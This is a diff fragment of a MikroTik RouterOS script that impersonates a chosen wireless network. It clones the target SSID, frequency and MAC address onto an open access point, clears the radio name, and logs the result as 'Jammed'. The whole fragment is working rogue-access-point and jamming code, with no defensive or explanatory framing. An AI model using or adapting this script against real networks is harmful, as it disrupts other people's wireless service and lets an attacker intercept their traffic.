@@ -30,7 +30,7 @@
   :local freq [:pick [:pick $data 2] 0 [:find [:pick $data 2] "/"]]
   :if ($ssid="'" . $TARGETSSID . "'") do={
     /interface wireless security-profiles set 0 mode=none supplicant-identity=""
-    /interface wireless set $WLANIFACE mode=ap-bridge ssid=$TARGETSSID frequency=$freq mac-address=$mac
+    /interface wireless set $WLANIFACE mode=ap-bridge ssid=$TARGETSSID frequency=$freq mac-address=$mac radio-name=""
     /interface wireless enable $WLANIFACE
     :log info "Jammed: $TARGETSSID $freq $mac"
   }
